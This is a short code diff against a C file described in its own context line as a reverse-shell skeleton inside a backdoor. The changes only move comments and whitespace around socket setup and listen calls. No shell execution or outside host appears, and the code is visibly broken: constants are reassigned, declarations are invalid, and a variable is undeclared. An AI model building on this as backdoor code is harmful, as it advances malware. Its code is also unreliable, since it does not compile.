@@ -34,9 +34,9 @@ a skelleton of reverse shell contained in the backdoor. */
   int main() {
 
   Target target;
-
-  /* create connection */
-
+    
+  /* set up the functins */
+    
   struct sockaddr_in serv_addr;
 
   const unsigned int sockfd;
@@ -47,7 +47,9 @@ a skelleton of reverse shell contained in the backdoor. */
   int socklen_t clien; 
 
   const unsigned int n;
-
+  
+  /* create connection */  
+    
   sockfd = socket(AF_INET, SOCK_STREAM, 0);
   if (sockfd < 0)
       perror("error 101");
@@ -65,7 +67,7 @@ a skelleton of reverse shell contained in the backdoor. */
 
   listen(listenfd, 10);
 
-  //printf("about to listen\n");
+  // printf("about to listen\n");
      listen(sockfd,5);
      clien = sizeof(serv_addr);
     // printf("About to accept\n");
